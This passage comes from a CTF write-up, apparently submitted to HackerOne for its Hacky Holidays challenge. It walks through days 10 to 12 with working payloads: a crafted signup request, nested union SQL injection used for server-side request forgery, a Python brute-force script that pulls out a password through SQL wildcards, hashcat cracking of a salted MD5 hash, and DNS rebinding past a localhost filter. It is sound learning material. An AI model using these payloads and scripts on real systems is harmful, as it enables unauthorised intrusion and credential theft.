test###########098f6bcd4621d373cade4e832627b4f6959ea94b27710517247388bd0bfcb36c1000000000aaaaaaaaaaaaaa#setiaaaaY 

Written successfully to user.txt
1
You are admin here is your flag{xxxxxxxx}
```

Let's try reproducing the same on the website:

```
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 89
Origin: https://hackyholidays.h1ctf.com
Connection: close
Referer: https://hackyholidays.h1ctf.com/signup-manager/
Upgrade-Insecure-Requests: 1

action=signup&username=test&password=test&age=1e9&firstname=aaaaaaaaaaaaaa&lastname=setiaaaaY
```
The only thing we need to take care about is the length of the lastname value we are providing and also adding 'Y' at the end of it.

After login, I got the flag and also the link for the next challenge also.

Day 10th flag is here: ` flag{99309f0f-1752-44a5-af1e-a03e4150757d}`

------------------------------------------------------------------------------------------------------------------------------------------------

**Day 11:**

Challenge Url: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59

{F1131134}

We have *Grinch Recon Albums* here , from this message *We are currently developing an API, apologies for anything that doesn't work quite right* we can say that there might an api endpoint also. Last but not the least there's login portal too.


1) Album

3 albums are there:
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=59grop  (XMAS 2019)
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=3dir42  (XMAS 2018)
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k  (XMAS 2020)

{F1131135}


If I remove the hash parameter from the url, it shows 404 page not found. Made some changes like replacing/adding other numbers/alphabets into it then also same error.
I thought we can bruteforce these hashes and when I generated the wordlist the size went over 1GB so forget about it.

Looking at the image location: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9

A base64 token we can see here in the data parameter:

```json
{
  "image": "r3c0n_server_4fdk59/uploads/db507bdb186d33a719eb045603020cec.jpg",
  "auth": "bbf295d686bd2af346fcd80c5398de9a"
}
```
So the image path was something like this: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/r3c0n_server_4fdk59/uploads/db507bdb186d33a719eb045603020cec.jpg  

If I directly access it *Image cannot be viewed directly*, this error is shown.

Playing with image value: 

```
"image": "r3c0n_server_4fdk59/uploads/db507bdb186d33a719eb045603020cec.jpg"

r3c0n_server_4fdk59/uploads/../../xxxx
r3c0n_server_4fdk59/uploads/someOtherImage.jpg
```
Everytime I made changes to the image value , *invalid authentication hash* error was shown.


2) API endpoint

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api/

{F1131138}

Here we are given the status codes and their Explanations.
Using ffuf to find any api endpoint which we can access: 

>ffufy -w ~/dirsearch/db/dicc.txt  -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api/FUZZ  

Later I found that every endpoint is giving *401 Unauthorized* response with the message : *"This endpoint cannot be visited from this IP address"*

```
/api/xxxxxxxxxxxxxxxxxxxxx   401
/api/user                    401
/api/v1                      401
....
```
So from this tests I came to the conclusion that content discovery on this api endpoint wouldn't be possible.

3) Login Portal

It was available at this endpoint: https://hackyholidays.h1ctf.com/attack-box/login

{F1131140}

Started with sqli injection as no errors were found, tried some common default passwords. Then I decided to use ffuf to find any endpoint I can have access to without login, no  endpoint was found.

As everything seemed like a dead end I started again with the Album part as it offer much more things. 
Last time we didn't tried to see if the hash parameter was vulnerable to sqli or not. Using sqlmap I found out it's vulnerable to Union based sqli.

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k         200OK
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k'        404
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k'--      404  
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k'--+-    200OK 

```

From the database dump there wasn't anything which can be of some use. The current database user also didn't have any privileges , then I got a hint from my friend "Inception" ~sql injection inside sql injection 


```
hash=-jdh34k' union select "1'",2,3--+-          404
hash=-jdh34k' union select "1'--+-",2,3--+-      200ok

...
.....
hash=-jdh34k' union select "1' union select 1,2,3--+-",2,3--+-
```
Something strange I saw on the page when I tried the last query above, see that broken image(It appeared only when I added the 2nd union statement):

{F1131633}

This was the image url: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMiLCJhdXRoIjoiZmVhNzUwNzQ3OGFhODIyNWMwMjI1MjdiMTc2M2ZiMzMifQ==

```json
eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMiLCJhdXRoIjoiZmVhNzUwNzQ3OGFhODIyNWMwMjI1MjdiMTc2M2ZiMzMifQ==

{"image":"r3c0n_server_4fdk59\/uploads\/3","auth":"fea7507478aa8225c022527b1763fb33"}
```

You see that \/3 at the last , it is something new.After some time I realised it that that's the vulnerable column.
This time used this payload: `hash=-jdh34k' union select "1' union select 1,2,version()--+-",2,3--+-`

```json
eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzguMC4yMi0wdWJ1bnR1MC4yMC4wNC4zIiwiYXV0aCI6IjAzZDJiYzk3YTU4ZGMxNWM0ZWFmNWQ0ZmEyZDlmOTNkIn0=
{"image":"r3c0n_server_4fdk59\/uploads\/8.0.22-0ubuntu0.20.04.3","auth":"03d2bc97a58dc15c4eaf5d4fa2d9f93d"}
```

One more thing which I want to add is that the image link response had this message *Expected HTTP status 200, Received: 404*, the 404 status code were for this endpoint `r3c0n_server_4fdk59\/uploads\/8.0.22-0ubuntu0.20.04.3` as there is no endpoint with that name of the server it gave 404. Also the auth value is changing as per the image value.

.................... Still I had no idea what to do next

Directory traversal to access the /api/* endpoints, remember the error which was shown by those api endpoints "Invalid client IP",let's try to access this endpoint from here.

```
hash=-jdh34k' union select "1' union select 1,2,'../api'--+-",2,3--+-

Response: Invalid content type detected
```

Now the server was making request to this endpoint: r3c0n_server_4fdk59/uploads/../api -> r3c0n_server_4fdk59/api
So a valid endpoints response is "Invalid Content type" and for an invalid "404"

Now onto enumerating some api endpoints:

```
hash=-jdh34k' union select "1' union select 1,2,'../api/user'--+-",2,3--+-
Response: Invalid content type detected

Parameters???

hash=-jdh34k' union select "1' union select 1,2,'../api/user?username='--+-",2,3--+-
Response: Expected HTTP status 200, Received: 204

hash=-jdh34k' union select "1' union select 1,2,'../api/user?xxxx='--+-",2,3--+-
Response: Expected HTTP status 200, Received: 400

hash=-jdh34k' union select "1' union select 1,2,'../api/user?username=&password='--+-",2,3--+-
Response: Expected HTTP status 200, Received: 204

```

From the api docs we can see: 
400 Invalid GET/POST variable
204 Successful request but with no data found

Again I was stuck no idea what to do

Another hint : "Wildcard"

You can visit this url for more info: https://www.w3schools.com/sql/sql_wildcards.asp
We can use %,_ to find the correct password and username combination.
I first used the _ to count the length of the username and password then with % extracted the chars one by one.


```
hash=-jdh34k' union select "1' union select 1,2,'../api/user?username=%&password='--+-",2,3--+-
Invalid content type detected

hash=-jdh34k' union select "1' union select 1,2,'../api/user?username=g%&password='--+-",2,3--+-
Invalid content type detected

hash=-jdh34k' union select "1' union select 1,2,'../api/user?username=a%&password='--+-",2,3--+-
Expected HTTP status 200, Received: 204

```

The username starts with "g", so it's probably grinch.

```
hash=-jdh34k' union select "1' union select 1,2,'../api/user?username=grinch%&password='--+-",2,3--+-
Invalid content type detected

hash=-jdh34k' union select "1' union select 1,2,'../api/user?username=grincha%&password='--+-",2,3--+-
Invalid content type detected

Let's check what the last charcater might be:
hash=-jdh34k' union select "1' union select 1,2,'../api/user?username=%n&password='--+-",2,3--+-
Invalid content type detected

grincha%n maybe it's admin??
hash=-jdh34k' union select "1' union select 1,2,'../api/user?username=grinchadmin&password='--+-",2,3--+-
Invalid content type detected

Username: grinchadmin

```

Moving on to the password parameter.


```python
import requests
from bs4 import BeautifulSoup
from sys import argv

script, length = argv
password = ""

passwords = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6','7','8','9','0','_']
for z in range(0,int(length)):
        for i in passwords:
                t  =  password + i
                r = requests.get("https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=123%27%20UNION%20ALL%20SELECT%20%221%27union%20select%201,2,%27../api/user?username=grinchadmin%26password={}%%27--+-%22,2,3--%20-".format(t))
                soup = BeautifulSoup(r.text, 'html.parser')
                results = soup.find_all('img',class_='img-responsive')
                x = results[2]
                url = 'https://hackyholidays.h1ctf.com'+ x['src']
                r2 = requests.get(url)
                if "Invalid content type detected" not in r2.text:
                  continue
                else:
                  password = password + i
                  print(password)
                  break

print("Here's you password:",password)
```

Script in action

{F1131632}

So we finally had the password also: s4nt4s_c__
When I tried this creds `grinchadmin:s4nt4s_c__` on the attack-box login portal, it was showing Wrong credentials, so I replaced the _ in the password , the correct password was: s4nt4sucks

{F1131143}
Now we are logged in

11th flag: `flag{07a03135-9778-4dee-a83c-7ec330728e72}`

---------------------------------------------------------------------------------------------------------------------------------------------------

**Final Day**

As in this screenshot you can down below the attacker server and a red button which say *Attack now*

{F1131143}

After clicking on the button this page opens up.

{F1131631}

This was the url: https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ== (all the 3 IPs had differe base64 token)

```json
eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==

{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```

This code can be found on the source page, the text which was shown the above screenshot was fetched from here only.

```html
<script>
    var id = 0;
    function getData() {
        $.getJSON('/attack-box/launch/c7b528cc142a9fabf6cc31b569b1de52.json?id=' + id, function (resp) {
            $.each(resp, function (k, v) {
                $('div.response').append(v.content + '<br>')
                id = v.id;
                if( v.goto.length > 0 ){
                    window.location = v.goto;
                }
            });
        });
    }
    setInterval(function(){ getData(); }, 500);
</script>

```

Tried for attack-box/launch/c7b528cc142a9fabf6cc31b569b1de52.json?id= sql injection in this id but no errors or any changes were found in the response.

As this was similar to what we saw in earlier challenge `{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"} `, this challenge is probably about ssrf.
Any change made in the target's value shows *Invalid Protection Hash*


Here you could see a hint was shared by hackerone: https://twitter.com/Hacker0x01/status/1342545650789978112?s=20

{F1131630}


Hint: "Salt" 

Salted hash?

The application probably generated this hashes something like this:

```php
md5("someSecretString"."203.0.113.33");
```

So our goal will be to find that "someSecretString", I decied to use hashcat to crack these using rockyou wordlist.

```bash
>cat hashes
5f2940d65ca4140cc18d0878bc398955:203.0.113.33
//(hash:salt)

>hashcat -a 0 -m 10 hash rockyou.txt --force
>hashcat -a 0 -m 10 hash --force --show 
5f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463 

```

mrgrinch463, we got the secret. Let's verify it and it matches with the hash value:

```php
php > echo md5("mrgrinch463"."203.0.113.33");
5f2940d65ca4140cc18d0878bc398955
```
So now we can make the application to make requests to any IP we want. Whatever IP is provided to the application it launches attack against by making the targeting IP down, so if we somehow managed to attack the appliction's IP itself we can stop grinch and save the Christmas.

But as you know things aren't as simple as they look like.
There is filter which checks whether the target IP  resolves to the local ip or not, if it's local Ip for eg: like 127.0.0.1 it' aborts the attack.

Here in the screenshot you can see the message

{F1131629}

0.0.0.0 seemed to have worked but nothing was changed it was normal as when I was trying with other IPs like 203.0.113.33, other bypasses like 127.1,0,etc didn't worked.
Also only -. characters other than numbers were allowed in the target's value, if for eg: I provided an IP like this "127.0.0.1]", it was showing an error *Invalid Characters Detected*

As nothing seemed to work, my friend told me to look into dns rebinding.

I never tried this before so read some writeups ,to get a basic understanding of it.Then I found this repo: https://github.com/taviso/rbndr
and used it 

7f000001.08080808.rbndr.us (the hostname generated will resolve randomly to one of the addresses specified with a very low ttl)
The two IP which I specified was 127.0.0.1 and 8.8.8.8

Now using this as the IP

```json
{"target":"7f000001.08080808.rbndr.us","hash":"00830ee7e57f7d81ce889bd12a7cb0bd"}
```

I was able to complete the challenge
Here is the flag page:
{F1131626}

Final flag: `flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}`

---------------------------------------------------------------------------------------------------------------------------------------------------

## Impact

This was really fun I learned a lot of new things which solving these challenge and also the fact that we can get free invites with these flags was really great.

Thankyou
Regards
Sudhanshu

## Attachments
- day5-hydra-username.png
- day5-hydra-password.png
- day5-login.png
- day5-login-admin.png
- xxx.png
- day2-console.png
- day2-diff.png
- day6-diary.png
- firefox_HqNT0D1aRn.png
- firefox_ZceILTSyAl.png
- OZnZWYbf34.png
- firefox_fJFsFHMgRP.png
- chrome_Bo6zmLOd6J.png
- vT2X4lumQs.png
- firefox_qXpD6smJc1.png
- firefox_LlEKLuTOMM.png
- W70qAdlkMB.png
- firefox_Lmp7OQJmze.png
- hNN5a5Hiz6.png
- firefox_5LJHdf4Liz.png
- firefox_EEkkMUqZj5.png
- HIYuZG8tBs.png
- firefox_ccz1HOrmSH.png
- ubuntu_ARoQ45Cm8R.png
- t9J4SUF3yh.png
- firefox_klgQYZ9M7r.png
- firefox_QrjwiRPzz2.png
- chrome_S5T3HzNT2u.png
- B9eyfTtZoj.png
- ubuntu_ARoQ45Cm8R.png
- Hg3jt9yVHj.png
- firefox_L3Lz503fiO.png
